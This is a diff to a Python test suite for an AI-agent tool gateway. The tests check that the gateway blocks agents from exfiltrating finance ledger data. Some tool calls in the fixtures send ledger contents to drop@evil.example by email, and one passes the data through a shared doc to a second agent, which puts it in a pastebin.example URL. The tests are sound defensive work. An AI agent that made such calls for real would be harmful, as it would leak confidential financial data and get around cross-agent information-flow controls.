@@ -70,7 +70,7 @@ def test_session_flow_allow_and_block(gw):
     assert post(gw, {"jsonrpc": "2.0", "method": "notifications/initialized"}, t, sid)[0] == 202
     _, _, body = post(gw, call(1, "finance.query_ledger"), t, sid)
     assert "Northwind" in text(body)
-    _, _, body = post(gw, call(2, "email.send", {"to": "drop@evil.example", "body": "x"}), t, sid)
+    _, _, body = post(gw, call(2, "email.send", {"to": "drop@evil.example", "body": "TX-1043 Fabrikam 1280.50"}), t, sid)
     assert body["result"]["isError"] and "finance" in text(body)
     ok, n, _ = verify_log(gw.log_path)
     assert ok and n == 2
@@ -143,11 +143,12 @@ def test_cross_agent_laundering_blocked_over_http(gw):
     a = token()
     sa = init(gw, a)
     post(gw, call(1, "finance.query_ledger"), a, sa)
-    post(gw, call(2, "docs.write", {"path": "notes/q4", "content": "ledger"}), a, sa)
+    ledger = text(post(gw, call(3, "finance.query_ledger"), a, sa)[2])
+    post(gw, call(2, "docs.write", {"path": "notes/q4", "content": ledger}), a, sa)
     b = token(agent="research-assistant", principal="user:m@corp.example", instance="inst-2")
     sb = init(gw, b)
     post(gw, call(1, "docs.search", {"q": "q4"}), b, sb)
-    _, _, body = post(gw, call(2, "web.fetch", {"url": "https://pastebin.example/?d=x"}), b, sb)
+    _, _, body = post(gw, call(2, "web.fetch", {"url": "https://pastebin.example/?d=Contoso-72300"}), b, sb)
     assert body["result"]["isError"] and "written to docs:notes/q4 by expense-bot" in text(body)
 
 
